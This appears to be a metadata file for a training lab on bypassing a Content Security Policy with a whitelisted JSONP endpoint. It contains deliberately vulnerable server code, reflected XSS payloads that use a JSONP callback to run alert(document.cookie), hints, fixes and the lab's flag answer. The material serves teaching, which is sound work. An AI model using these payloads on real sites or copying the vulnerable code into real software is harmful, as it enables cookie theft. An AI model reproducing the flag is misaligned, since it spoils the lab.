// src/modules/practice-labs/xss/labs/lab4/lab4.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const xssLab4Metadata: LabMetadata = {
  slug: 'xss-csp-bypass',
  title: 'XSS: CSP Bypass via JSONP',
  ar_title: 'XSS: تجاوز CSP عبر JSONP',
  description:
    'A strict Content Security Policy is in place — but a whitelisted JSONP endpoint can be abused to bypass it and execute arbitrary JavaScript.',
  ar_description:
    'يوجد سياسة أمان محتوى صارمة — لكن يمكن إساءة استخدام نقطة JSONP مدرجة في القائمة البيضاء لتجاوزها وتنفيذ JavaScript عشوائي.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: ['XSS', 'CSP Bypass', 'JSONP Abuse', 'Allowlist Exploitation'],
  xpReward: 280,
  pointsReward: 140,
  duration: 50,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  canonicalConceptId: 'xss-csp-bypass',
  environmentType: 'PORTAL_AUTH',

  missionBrief: {
    codename: 'WHITELISTED WEAPON',
    classification: 'TOP_SECRET',
    objective: 'The target app has CSP enforced. Direct inline scripts are blocked. But the CSP allows a trusted JSONP endpoint that accepts a callback parameter. Abuse it.',
    ar_objective: 'التطبيق المستهدف لديه CSP مُطبَّق. السكريبتات المضمَّنة مباشرة محجوبة. لكن CSP يسمح بنقطة JSONP موثوقة تقبل معامل callback. أسئ استخدامها.',
    background: 'JSONP endpoints that appear in CSP allowlists are a well-known CSP bypass vector. Any script allowed by CSP can be used to execute arbitrary JS via the callback parameter.',
    successCriteria: [
      'Identify the reflected XSS injection point',
      'Confirm inline scripts are blocked by CSP',
      'Find the whitelisted JSONP endpoint',
      'Craft a script src pointing to the JSONP endpoint with a malicious callback',
      'Bypass CSP and execute JavaScript',
    ],
    warningNote: 'CSP bypasses require understanding both the injection point AND the CSP header.',
  },

  labInfo: {
    vulnType: 'XSS with CSP Bypass (JSONP)',
    ar_vulnType: 'XSS مع تجاوز CSP عبر JSONP',
    cweId: 'CWE-79',
    cvssScore: 8.2,
    description: 'JSONP endpoints wrap data in a function call specified by the callback parameter. If a JSONP endpoint is on the CSP allowlist, an attacker can use it as a script source with a malicious callback to execute arbitrary JS.',
    ar_description: 'نقاط JSONP تُغلِّف البيانات في استدعاء دالة محدد بمعامل callback. إذا كانت نقطة JSONP في قائمة CSP البيضاء، يمكن للمهاجم استخدامها كمصدر سكريبت مع callback خبيث لتنفيذ JS عشوائي.',
    whatYouLearn: [
      'How CSP script-src allowlists work',
      'Why JSONP endpoints in allowlists break CSP',
      'How to enumerate CSP headers',
      'Real-world CSP bypass techniques',
    ],
    techStack: ['Node.js', 'JSONP', 'CSP Headers', 'Browser'],
    references: [
      { label: 'PortSwigger: Bypassing CSP with JSONP', url: 'https://portswigger.net/research/bypassing-csp-with-dangling-iframes' },
    ],
  },

  goal: 'Bypass the Content Security Policy using the whitelisted JSONP endpoint to execute arbitrary JavaScript.',
  ar_goal: 'تجاوز سياسة أمان المحتوى باستخدام نقطة JSONP المدرجة في القائمة البيضاء لتنفيذ JavaScript عشوائي.',

  briefing: {
    en: `SecurePortal has XSS protection via CSP: script-src 'self' https://api.trusted-cdn.com
You found a reflected XSS point. But your inline <script> tags are blocked.
You check the CSP: api.trusted-cdn.com is whitelisted.
You probe api.trusted-cdn.com/jsonp?callback=test → returns: test({"data":"ok"})
A JSONP endpoint on a whitelisted domain.
A reflected XSS injection point.
Put them together.`,
    ar: `SecurePortal لديه حماية XSS عبر CSP: script-src 'self' https://api.trusted-cdn.com
وجدت نقطة XSS انعكاسية. لكن وسوم <script> المضمَّنة محجوبة.
تتحقق من CSP: api.trusted-cdn.com في القائمة البيضاء.
تستكشف api.trusted-cdn.com/jsonp?callback=test → يُعيد: test({"data":"ok"})
نقطة JSONP على نطاق في القائمة البيضاء.
نقطة حقن XSS انعكاسية.
اجمعهما معاً.`,
  },

  stepsOverview: {
    en: [
      'Find the XSS injection point and confirm CSP blocks inline scripts',
      'Read the CSP header — identify whitelisted domains',
      'Test the JSONP endpoint: /jsonp?callback=alert(1)',
      'Inject a <script src="https://api.trusted-cdn.com/jsonp?callback=alert(document.cookie)">',
      'CSP allows it (trusted-cdn.com is whitelisted) → script executes',
    ],
    ar: [
      'ابحث عن نقطة حقن XSS وأكّد أن CSP يحجب السكريبتات المضمَّنة',
      'اقرأ header الـ CSP — حدّد النطاقات في القائمة البيضاء',
      'اختبر نقطة JSONP: /jsonp?callback=alert(1)',
      'احقن <script src="https://api.trusted-cdn.com/jsonp?callback=alert(document.cookie)">',
      'CSP يسمح به (trusted-cdn.com في القائمة البيضاء) → ينفذ السكريبت',
    ],
  },

  solution: {
    context: 'CSP: script-src \'self\' https://api.trusted-cdn.com. Reflected XSS in /search?q=. JSONP at /api/jsonp?callback=.',
    vulnerableCode: "res.setHeader('Content-Security-Policy', \"script-src 'self' https://api.trusted-cdn.com\");\nres.send(`<h2>Results for: ${query}</h2>`); // unsanitized",
    exploitation: "/search?q=<script src='https://api.trusted-cdn.com/jsonp?callback=alert(document.cookie)'></script>",
    steps: {
      en: [
        'GET /search?q=<script>alert(1)</script> → CSP blocks it',
        'Check CSP header → api.trusted-cdn.com is whitelisted',
        'GET /api/jsonp?callback=alert(1) → returns alert(1)({"data":"ok"})',
        'Inject: <script src="https://api.trusted-cdn.com/jsonp?callback=alert(document.cookie)"></script>',
        'CSP allows the script (it\'s from trusted-cdn.com) → executes → flag returned',
      ],
      ar: [
        'GET /search?q=<script>alert(1)</script> → CSP يحجبه',
        'تحقق من header الـ CSP → api.trusted-cdn.com في القائمة البيضاء',
        'GET /api/jsonp?callback=alert(1) → يُعيد alert(1)({"data":"ok"})',
        'احقن: <script src="https://api.trusted-cdn.com/jsonp?callback=alert(document.cookie)"></script>',
        'CSP يسمح بالسكريبت (من trusted-cdn.com) → ينفذ → يُعاد العلم',
      ],
    },
    fix: [
      'Remove JSONP endpoints — use CORS instead',
      'If JSONP must exist, validate callback against a strict allowlist',
      "Use CSP nonces: script-src 'nonce-{random}' instead of domain allowlists",
      'Never include JSONP endpoints in CSP allowlists',
    ],
  },

  postSolve: {
    explanation: {
      en: 'CSP domain allowlists are only as secure as the domains they allow. A JSONP endpoint on a trusted domain lets an attacker inject a script source that CSP permits — but the callback parameter controls the executed JavaScript.',
      ar: 'قوائم CSP البيضاء للنطاقات آمنة بقدر أمان النطاقات التي تسمح بها. نقطة JSONP على نطاق موثوق تتيح للمهاجم حقن مصدر سكريبت يسمح به CSP — لكن معامل callback يتحكم في JavaScript المُنفَّذ.',
    },
    impact: {
      en: 'Complete CSP bypass despite a seemingly strict policy. XSS executes in any browser with no CSP warnings.',
      ar: 'تجاوز كامل لـ CSP رغم السياسة الصارمة ظاهرياً. ينفذ XSS في أي متصفح بدون تحذيرات CSP.',
    },
    fix: ['CSP nonces', 'Remove JSONP', 'Strict JSONP callback validation'],
  },

  hints: [
    {
      order: 1, xpCost: 20,
      content: 'Try injecting <script>alert(1)</script> first. Read the browser console — the CSP error message will tell you exactly what\'s allowed.',
      ar_content: 'جرّب حقن <script>alert(1)</script> أولاً. اقرأ console المتصفح — رسالة خطأ CSP ستخبرك بالضبط بما هو مسموح.',
    },
    {
      order: 2, xpCost: 35,
      content: 'The CSP allows api.trusted-cdn.com. Visit that domain — does it have a JSONP endpoint? Try /jsonp?callback=test.',
      ar_content: 'CSP يسمح بـ api.trusted-cdn.com. زر ذلك النطاق — هل لديه نقطة JSONP؟ جرّب /jsonp?callback=test.',
    },
    {
      order: 3, xpCost: 50,
      content: 'Inject a script tag that sources from the JSONP endpoint with your payload as callback:\n<script src="https://api.trusted-cdn.com/jsonp?callback=alert(document.cookie)"></script>',
      ar_content: 'احقن وسم script يأخذ مصدره من نقطة JSONP مع payload-ك كـ callback:\n<script src="https://api.trusted-cdn.com/jsonp?callback=alert(document.cookie)"></script>',
    },
  ],

  flagAnswer: 'FLAG{XSS_CSP_BYPASS_JSONP_ALLOWLIST_991}',
  initialState: {},
};
